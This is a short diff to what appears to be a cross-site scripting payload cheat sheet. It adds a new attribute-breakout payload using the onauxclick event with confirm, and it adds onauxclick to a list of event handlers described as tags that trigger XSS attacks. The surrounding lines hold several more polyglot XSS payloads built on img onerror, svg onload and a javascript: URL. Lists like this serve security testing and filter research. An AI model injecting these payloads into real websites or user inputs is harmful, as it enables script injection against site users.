@@ -5,6 +5,7 @@
 <--`<img/src=` onerror=confirm``> --!>
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 123<svg/onload=aler\u0074/**/`11`>456
+"><b onauxclick=["xss"].some(confirm)>copy me
 
 
 Tags to Trigger XSS Attacks:
@@ -31,6 +32,7 @@ onfocus
 onreset
 onselect
 onMoveOn
+onauxclick
 
 
 Brackets for Tags
